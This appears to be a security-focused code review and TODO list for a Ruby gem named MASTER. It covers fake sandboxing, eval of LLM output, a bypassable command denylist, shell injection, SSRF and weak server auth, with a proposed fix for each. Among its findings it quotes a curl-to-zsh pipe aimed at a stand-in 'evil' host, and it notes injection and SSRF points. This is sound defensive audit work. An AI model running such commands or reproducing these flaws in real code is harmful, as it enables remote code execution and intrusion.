# MASTER TODO — Full Reanalysis

## Context
- Scope: the MASTER gem at this path (`lib/` ≈ 21.6k Ruby lines, ~120 .rb files, 45 principle YAMLs,
  26 config YAMLs, 5 schemas, **only 5 test files**). Analyzed fresh, on its own terms.
- Push to `claude/pub4-code-review-btGKK` (PR #1). Never push to main/master without permission.
- Platform: OpenBSD 7.8, Ruby 3.4, zsh. BANNED: bash/awk/sed/tr/python/sudo (use zsh + `doas`).
- Constitution: no swallowed errors (FAIL_VISIBLY), files < 300 lines, Result Ok/Err monad,
  data/lib-config single source of truth, SELF_APPLY (MASTER must pass its own scan).
- Validate: `cd MASTER && bundle exec ruby bin/master scan lib`.
- Method note: high-risk files (execution, boot, server, safety, web, pledge) were read in full;
  the remainder was pattern-swept (242 rescue clauses, stub markers, hardcoded paths, exec surface).
  Items tagged *(verify caller)* need a reachability check before fixing.

---

## ✅ Landed on this branch
- **P0.1** — replaced the fake "Would pledge" logger with real `Pledge` syscall delegation
  (`lib/pledge.rb`); honest no-op off OpenBSD, opt-in via `MASTER_PLEDGE=1` on-target until the
  promise set is verified (an incorrect set SIGABRTs the CLI). No more false-confidence logging.
- **P0.2** — removed hardcoded `/home/runner/...` CI paths; unveil paths now derive from `MASTER::ROOT`;
  fixed the stray CI path in `config/langchain.yml`.
- **P2.0 (new)** — defined the missing core constants `MASTER::ROOT`, `LIB`, `CODENAME`, `BOOT_TIME`
  in `master.rb`. They were referenced across boot/server/replicate/principle/openbsd but defined
  nowhere → latent `NameError` on every path that touched them.

---

## P0 — Fake functionality that reports success (FAIL_VISIBLY / false green)

### P0.1 — CLI "security hardening" is a no-op — lib/core/openbsd_pledge.rb — ✅ done (see above)
`OpenBSDPledge.pledge`/`.unveil` only **log** `"Would pledge: …"` / `"Would unveil: …"` and never call
the syscalls (lines 30-58). `Boot.apply_openbsd_security` invokes `OpenBSDPledge.cli_profile`, so the
CLI claims it is sandboxed while running with **no pledge/unveil at all**. Meanwhile a **real,
working** implementation exists in `lib/pledge.rb` (Fiddle → libc `pledge(2)`/`unveil(2)`).
**Fix**: delete the fake module; route boot/server through `lib/pledge.rb`. One pledge implementation.

### P0.2 — Hardcoded GitHub Actions paths baked into config — ✅ done (see above)
> Note: `config/langchain.yml` is also **dead config** — nothing in `lib/` reads it. Either wire it
> into the langchain sandbox setup or delete it (tracked under P3/SSOT cleanup).

### P0.3 — "Framework" auto-fixers are placeholders that claim to work
These report success while doing nothing:
- `lib/framework/copilot_optimization.rb:193,323,333` — completion/comment/restructure = placeholders
- `lib/framework/universal_standards.rb:329,334` — auto-fix indentation / line length = placeholders
- `lib/framework/behavioral_rules.rb:89,142` — semantic check + fix suggestion = placeholders
**Fix**: implement, or have them return `Result.err`/log "not implemented" so a no-op never reads as
a pass. (These four `framework/*` files are also >300 lines — see P3.1.)

### P0.4 — "Intelligence" that is actually randomness
- `lib/swarm.rb:319,322` — similarity and sentiment are `# Random for now`. Swarm consensus is noise.
- `lib/core/semantic_cache.rb:86` — "semantic" cache keys off **character frequency**, not embeddings;
  it is not semantic and will mis-hit. **Fix**: wire to a real embedding (Weaviate is already present)
  or rename it to what it is and document the limitation.

---

## P1 — Execution-layer security (arbitrary code execution)

### P1.1 — `Safety` is a bypassable denylist — lib/safety.rb
`command_safe?` (8 regexes) / `ruby_safe?` (9 regexes) are trivially evaded:
- The curl-pipe guard `/curl.*\|\s*(ba)?sh/` blocks `sh`/`bash` but **not `zsh`** — and `zsh` is the
  executor's own `PREFERRED_SHELL`. `curl evil|zsh` passes.
- `ruby_safe?` omits `IO.popen`, `Open3.*`, `%x{}`, `send(:system,…)`, `require`, `Process.spawn`,
  and `File.write` (only `File.delete/unlink` listed).
**Fix**: replace both with an allowlist, or drop in-process execution for a `lib/pledge.rb`-sandboxed
subprocess. A denylist cannot secure an LLM-controlled surface.

### P1.2 — `eval()` on LLM Ruby — lib/core/executor.rb:100
`eval(code, TOPLEVEL_BINDING.dup, …)`, gated only by the bypassable `ruby_safe?`. **SELF_APPLY
violation**: `lib/agents/security_agent.rb:13` flags `eval(` as *critical*. MASTER ships what it tells
users to remove. **Fix**: syntax-check in a subprocess (`ruby -c`); never `eval` model output.

### P1.3 — `react_executor` runs LLM input with NO gate — lib/core/react_executor.rb:130-165
`execute_tool` dispatches model "actions" directly: `file_write` → `File.write(match[1],match[2])`
(arbitrary path+content, :136), `shell_command` → `Open3.capture3(cmd)` (:141), `code_execution` →
`Open3.capture3("ruby", stdin_data: code)` (:159), `file_read` → arbitrary path. None touch `Safety`.
Tools `web_search`/`browse_page`/`x_keyword_search`/`vision_analyze` return `"[simulated …]"`.
**Fix**: *(verify caller)* if reachable, gate every branch (allowlist + unveil) and stop advertising
simulated tools as real; if dead, delete it.

### P1.4 — Three inconsistent command guards + an ungated Ruby runner
`Stages::Guard::DENY` (6 patterns), `Safety::DANGEROUS_COMMANDS` (8), and `Stages::Execute` (stages.rb)
which runs LLM ```ruby``` blocks via a Tempfile subprocess — sandboxed by real pledge on OpenBSD,
**unsandboxed elsewhere**, and not filtered by `Guard` (which only inspects `input[:text]`, not the
response body). **Fix**: one guard policy; ensure the Ruby runner is sandboxed on every platform.

### P1.5 — Shell injection + TLS bypass + SSRF in web fetch — lib/web.rb:135-146
`curl_browse` interpolates the URL into a backtick shell: `ftp -o - "#{url}"` (138),
`curl -sL … "#{url}"` (140), `curl -sLk … "#{url}"` (145). Crafted URL injects shell; `-k` disables
TLS verification; redirects are unfiltered → SSRF to `169.254.169.254`/loopback/RFC1918.
**Fix**: `Net::HTTP` with a validated `URI`, scheme allowlist, internal-IP blocklist, no `-k`,
re-validate host after each redirect.

### P1.6 — Server exposure & weak auth — lib/server.rb
- Binds `http://0.0.0.0:#{@port}` (line 68) → all interfaces. **Fix**: `127.0.0.1`.
- Token accepted from `QUERY_STRING['token']` (106) → leaks in logs/Referer. **Fix**: header only.
- `token == AUTH_TOKEN` (107) non-constant-time. **Fix**: `Rack::Utils.secure_compare`.
- Auth is skipped for any path matching `/\.\w+$/` (103) — extension-based bypass. **Fix**: explicit
  static allowlist.
- `GET /token` returns the token (181) — redundant behind auth; reconsider/remove.

### P1.7 — Interpolated `system()` in installer & TTS
- `lib/auto_install.rb` — `system("doas pkg_add -I #{name} …")`, `system("gem install #{name} …")`,
  `system("git clone … #{repo} #{target} …")`, `system("pkg_info -e '#{name}-*' …")`. Inputs are
  internal constants today (medium severity) but the form is wrong. **Fix**: array-exec.
- `lib/edge_tts.rb` / `lib/tts.rb` — interpolated `system("#{python} …")`, `` `#{python} …` ``,
  `system("powershell … '#{file}'")`, `system("aucat -i #{temp}")`. Also depends on **python**
  (banned on OpenBSD). **Fix**: array-exec; drop python.

---

## P2 — Correctness bugs

### P2.1 — `LLM::TIERS` contract mismatch crashes the boot banner — lib/boot.rb vs lib/llm.rb
`llm.rb` defines `TIERS` as a hash of **arrays** (`strong: %w[deepseek-r1 claude-sonnet-4]`) with
`TIER_ORDER`, and **no `DEFAULT_TIER`**. `boot.rb` treats `LLM::TIERS[key]` as a hash —
`info[:model].split('/')` (85, 205, 215) raises `TypeError` on an array — and references
`LLM::DEFAULT_TIER` (194, 216) → `NameError`. Note `bin/master` runs `Pipeline`, not `Boot.run`, so
boot.rb may be **orphaned** *(verify caller — bin/cli?)*. **Fix**: reconcile the TIERS shape across
both files (one canonical structure), or delete boot.rb if unreachable.

### P2.2 — Microkernel boot loads a file that doesn't exist — lib/kernel/boot.rb
Loads `config/system.yml` (absent; configs live in `lib/config/*.yml`) so it always boots with `{}`,
and module loading is an explicit `Phase 11 … placeholder` (95-97). This is a second, aspirational
boot system parallel to `lib/boot.rb`. **Fix**: pick one boot path; remove or finish the other.

### P2.3 — `Stages::Evolve` writes before validating — lib/stages.rb
Writes `content` to the target file before any syntax check, relying on a test-suite git rollback;
`IO.popen(test_cmd, …)` runs `input[:test_command]` as a shell string (injection if model-influenced).
**Fix**: syntax-check before write; array-exec the test command.

### P2.4 — Constitutional AI silently runs with zero principles — lib/boot.rb
`load_principles` is `Principle.load_all rescue []` — any load error yields an empty principle set and
boot continues. **Fix**: fail visibly if principles can't load.

---

## P3 — Constitution / SELF_APPLY violations

### P3.1 — 17 files exceed the 300-line limit
replicate.rb (841), evolve.rb (789), creative_chamber.rb (726), plugins/ai_enhancement.rb (551),
violations.rb (543), plugins/business_strategy.rb (454), server.rb (409), boot.rb (404),
memory.rb (398), plugins/web_development.rb (395), swarm.rb (388), agent_autonomy.rb (386),
framework/copilot_optimization.rb (367), framework/universal_standards.rb (347),
framework/quality_gates.rb (331), bug_hunting.rb (330), framework/workflow_engine.rb (312).
**Fix**: split by responsibility, or reconcile the rule in one place (`smells.rb`) and document why.

### P3.2 — 242 rescue clauses; many swallow
Heaviest: boot.rb (12), core/executor.rb (8), web.rb (6), server.rb (6), bot_manager.rb (6),
ui/swarm/piper_tts/harvester/dashboard/agent_autonomy (4 each). Audit every `rescue nil` / bare
`rescue` / `rescue => e` with unused `e`: log before any fallback, or re-raise.

### P3.3 — Duplicated constants / split sources of truth
- `MAX_FILE_LINES`/`MAX_METHOD_LINES` defined in **both** `lib/engine.rb` and `lib/smells.rb`.
- Principles live in **both** `data/principles.yml` (consolidated, preferred by `principle.rb`) **and**
  45 files in `lib/principles/*.yml` (legacy fallback). Pick one; delete or generate the other.

### P3.4 — Banned interpreters on an OpenBSD-only target
`edge_tts.rb` requires python; `Executor::SHELL_PATTERN` accepts ```bash```/```sh``` fences though the
platform is zsh-only. Constrain to zsh; remove python.

---

## P4 — Architecture sprawl (DRY / one-thing-well)
Multiple subsystems cover the same responsibility — map callers, then collapse:
- **Execution (3+):** `Pipeline`+`Stages` (the path `bin/master` actually uses), `core/executor.rb`,
  `core/react_executor.rb`, plus `Stages::Execute`/`Stages::Evolve`.
- **Boot (2):** `lib/boot.rb` (dmesg banner) vs `lib/kernel/boot.rb` (microkernel).
- **Orchestration (~10):** `lib/agents/` + `lib/actors/` (13 files) + `swarm.rb` + `chamber.rb` +
  `creative_chamber.rb` (726!) + `council.rb` + `cli_agents.rb` + `agent_autonomy.rb` + `autonomy.rb`
  + `prompt_autonomy.rb`.
- **TTS/audio (7):** `audio.rb`, `edge_tts.rb`, `piper_tts.rb`, `stream_tts.rb`, `tts.rb`,
  `web/orb_tts.rb`, `core/orb_stream.rb`.
- **Memory (5):** `memory.rb`, `session_memory.rb`, `core/reflection_memory.rb`,
  `core/session_persistence.rb`, `core/session_recovery.rb`.
- **Singular vs plural:** `persona.rb` vs `personas/`, `principle.rb` vs `principles/`,
  `framework/` vs `config/framework/`.

---

## P5 — Testing (largest single gap)
Only **5 test files** for ~21.6k lines of Ruby (`test/` has test_result, test_stages, test_self_repair,
test_pipeline, test_permission_gate). No meaningful coverage; MASTER cannot dogfood its own 80% gate.
**Fix**: add model/unit tests for the execution core, safety/pledge, llm tier selection, principle
loading, and the pipeline stages first (the security-critical paths), then broaden.

---

## Definition of done
1. P0: nothing reports success while doing nothing; one real pledge; no CI paths in config.
2. P1: no LLM-controlled string reaches `eval`/`system`/`sh -c`/backticks/`File.write` without an
   allowlist + `lib/pledge.rb` sandbox; web/SSRF-safe; server loopback-only, constant-time, header-auth.
   MASTER passes its own `security_agent` scan.
3. P2: boot/llm contracts agree; one boot path; self-edits validated before write.
4. P3: oversized files split (or rule reconciled); swallowed errors fixed; one source per constant/dataset.
5. P4: one executor, one boot, one orchestration model, one TTS entry, one memory layer.
6. P5: tests cover the execution/safety core; `bin/master scan lib` is clean.

## Git workflow
- Branch `claude/pub4-code-review-btGKK`; commit style `fix(safety): allowlist + pledge sandbox`.
- Never commit `.env`/keys (note: `MASTER/.env` is gitignored on this branch).
